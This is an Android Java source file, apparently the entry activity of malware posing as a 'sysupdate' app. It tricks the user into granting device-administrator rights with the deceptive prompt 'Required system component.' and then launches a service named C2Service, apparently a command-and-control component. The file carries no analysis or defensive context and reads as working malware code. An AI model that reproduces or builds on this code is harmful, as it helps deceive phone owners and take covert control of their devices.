package com.vanta.sysupdate;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        ComponentName admin = new ComponentName(this, AdminReceiver.class);
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (!dpm.isAdminActive(admin)) {
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required system component.");
            startActivity(i);
        } else {
            startService(new Intent(this, C2Service.class));
        }
        finish();
    }
}
